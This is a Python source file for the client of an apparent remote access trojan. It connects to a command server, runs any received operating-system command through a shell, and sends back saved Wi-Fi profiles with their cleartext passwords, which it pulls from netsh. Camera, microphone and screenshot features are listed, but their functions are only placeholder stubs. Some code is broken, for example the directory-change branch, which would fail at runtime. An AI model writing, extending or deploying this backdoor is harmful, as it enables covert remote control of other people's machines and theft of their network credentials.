import socket
import os
import subprocess
import shlex
import re
import json

SERVER_HOST = "127.0.0.1"
SERVER_PORT = 65432
current_directory = ""
def screanshort():
    return "Taking a screenshot..."

def stream_camera():
    return "Streaming camera..."

def stream_mic():
    return "Streaming microphone..."

def capture_video():
    return "Capturing video..."

def capture_audio():
    return "Capturing audio..."

def get_wifi_profiles():
    """
    Fetches available Wi-Fi profiles on the system.
    """
    try:
        result = subprocess.run(shlex.split('netsh wlan show profiles'),
                                capture_output=True, text=True)
        return re.findall(r"All User Profile\s+:\s+(.*)", result.stdout)
    except Exception as e:
        return f"Error: {e}"

def get_wifi_password(profile):
    """
    Fetches the password for a specific Wi-Fi profile.
    """
    try:
        result = subprocess.run(
            shlex.split(f'netsh wlan show profiles name="{profile}" key=clear'),
            capture_output=True, text=True
        )
        match = re.search(r"Key Content\s*:\s*(.*)", result.stdout)
        return {profile: match.group(1).strip() if match else "Not found"}
    except Exception as e:
        return f"Error: {e}"

def get_wifi_passwords():
    wifi_profiles_with_pwd = {}
    wifi_profiles = get_wifi_profiles()
    for profile in wifi_profiles:
        try:
            process_result = subprocess.run(shlex.split(f'netsh wlan show profiles name="{profile}" key=clear'),capture_output=True, text=True)
            # Extract 'Key Content' from Security settings
            key_content_match = re.search(r"Key Content\s*:\s*(.*)", process_result.stdout)
            profile_pwd = key_content_match.group(1).strip() if key_content_match else "Not found"
            wifi_profiles_with_pwd[profile] = profile_pwd
        except Exception as e:
            raise e
    return wifi_profiles_with_pwd

def sudo(command):
    """
    Executes a system command and returns the output.
    """
    try: # shell=True make subprocess.run to run the shell commands such as cd, ls, and so on
        if command[0] == "cd":
            # If 'cd' is followed by a directory, change to it
            if len(command) > 1:
                new_dir = os.path.join(current_directory, command[1])
                os.chdir(new_dir)
                current_directory = os.getcwd()
                return f"Changed directory to {current_directory}"
            else:
                # If 'cd' is called without arguments, go to the home directory
                current_directory = os.path.expanduser("~")
                os.chdir(current_directory)
                return f"Changed directory to {current_directory}"
        elif command[0] != "cd":
            result = subprocess.run(command, shell=True, capture_output=True, text=True, check=True)
            print(f"Output of '{command}':\nstdout:{result.stdout}\nstderr: {result.stderr}")
            if result.stdout.strip() == "":
                print(f"Command executed successfully. Process returned with process code {result.returncode}")
                return f"Process returned with process code {result.returncode}.\nStdout: '{result.stdout}'\nStderror: '{result.stderr}'"
            return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        return f"Commend execution failed. \nError: '{e.stderr.strip()}'.\nProcess returned with process code {e.returncode}"
    except Exception as ex:
        return f"Unexpected error: {ex}"

def help():
    """
    Generates a formatted help message listing commands and their descriptions.
    """
    if not COMMANDS:
        return "No commands available."
    
    # Calculate the width of the longest command for alignment
    max_command_length = max(len(command) for command in COMMANDS.keys())
    
    # Build the help message with aligned formatting
    help_message = "\nAvailable Commands:\n"
    for command, (_, description) in COMMANDS.items():
        help_message += f"{command.ljust(max_command_length + 2)}: {description}\n"
    
    return help_message



COMMANDS = {
    "help": (help, "Displays help information."),
    "exit": (exit,"Terminates the active connection."),
    "sudo": (sudo,"Execiutes the native OS command. Syntax: sudo <OS command to execute>."),
    "stream_mic": (stream_mic, "Streams the microphone."),
    "screanshort": (screanshort, "Takes a screenshot."),
    "stream_camera": (stream_camera, "Streams the camera."),
    "capture_video": (capture_video, "Captures video."),
    "capture_audio": (capture_audio, "Captures audio."),
    "get_wifi_profiles": (get_wifi_profiles, "Shows the available wifi profiles"),
    "get_wifi_passwords": (get_wifi_passwords, "Shoes the wifi password for all the wifi profiles.")
    
}

def execute_command(command):
    """
    Executes the received command from the server.
    """
    if command.startswith("sudo"):
        return sudo(shlex.split(command[len("sudo "):]))
    if command in COMMANDS:
        return COMMANDS[command][0]()
    return "Invalid command."

def client_main():
    """
    Entry point for the client application.
    """
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        client_socket.connect((SERVER_HOST, SERVER_PORT))
        print(f"[*] Connected to server at {SERVER_HOST}:{SERVER_PORT}")

        while True:
            command = client_socket.recv(4096).decode()
            if command in ("exit", "quit"):
                print("[*] Connection closed by server.")
                break

            print(f"[*] Command received: {command}")
            response = execute_command(command)

            if isinstance(response, (dict, list)):
                client_socket.sendall(json.dumps(response).encode())
            else:
                client_socket.sendall(str(response).encode())


if __name__ == "__main__":
    client_main()
